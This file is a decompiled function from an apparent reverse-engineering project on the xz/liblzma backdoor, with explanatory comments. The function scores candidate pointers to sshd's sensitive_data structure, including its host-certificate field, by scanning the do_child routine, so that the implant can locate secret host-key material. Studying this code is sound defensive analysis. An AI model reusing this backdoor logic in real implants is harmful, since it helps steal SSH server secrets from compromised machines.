// /home/kali/xzre-ghidra/xzregh/103870_sshd_score_sensitive_data_candidate_in_do_child.c
// Function: sshd_score_sensitive_data_candidate_in_do_child @ 0x103870
// Calling convention: __stdcall
// Prototype: int __stdcall sshd_score_sensitive_data_candidate_in_do_child(sensitive_data * sensitive_data, elf_info_t * elf, string_references_t * refs)


/*
 * AutoDoc: Uses the cached string reference for `do_child`, awards one point if it ever touches the candidate pointer, and then probes for one or two references to offset +0x10. The second half of the struct buys up to two additional points, yielding a 0–3 score that feeds the aggregate heuristic.
 */

#include "xzre_types.h"

int sshd_score_sensitive_data_candidate_in_do_child
              (sensitive_data *sensitive_data,elf_info_t *elf,string_references_t *refs)

{
  u8 *code_start;
  u8 *code_end;
  BOOL hit_found;
  long clear_idx;
  u8 **ctx_cursor;
  uint score;
  u8 zero_seed;
  dasm_ctx_t insn_ctx;
  u8 *do_child_start;
  u8 *do_child_end;
  
  zero_seed = 0;
  score = 0;
  // AutoDoc: Locate `do_child` via the `chdir_home_error` string reference and bail out if the symbol is missing.
  code_start = (u8 *)(refs->chdir_home_error).func_start;
  if (code_start != (u8 *)0x0) {
    code_end = (u8 *)(refs->chdir_home_error).func_end;
    // AutoDoc: Touching the base pointer once awards the initial point in the score.
    // AutoDoc: Reuse the same scanner to hunt for accesses to `sensitive_data + 0x10`; the first hit collects +1.
    hit_found = find_riprel_ptr_lea_or_mov_load(code_start,code_end,(dasm_ctx_t *)0x0,sensitive_data);
    score = (uint)(hit_found != FALSE);
    // AutoDoc: Reset the shared decoder scratch before hunting for additional `sensitive_data + 0x10` touches.
    ctx_cursor = &do_child_start;
    for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
      *(u32 *)ctx_cursor = 0;
      ctx_cursor = (u8 **)((u8 *)ctx_cursor + 4);
    }
    hit_found = find_riprel_ptr_lea_or_mov_load
                      (code_start,code_end,(dasm_ctx_t *)&do_child_start,
                       &sensitive_data->host_certificates);
    if (hit_found != FALSE) {
      // AutoDoc: A second access to the +0x10 field within the remaining code bumps the score by another point.
      hit_found = find_riprel_ptr_lea_or_mov_load
                        (do_child_end + (long)do_child_start,code_end,(dasm_ctx_t *)0x0,
                         &sensitive_data->host_certificates);
      if (hit_found == FALSE) {
        score = score + 1;
      }
      else {
        score = score + 2;
      }
    }
  }
  return score;
}

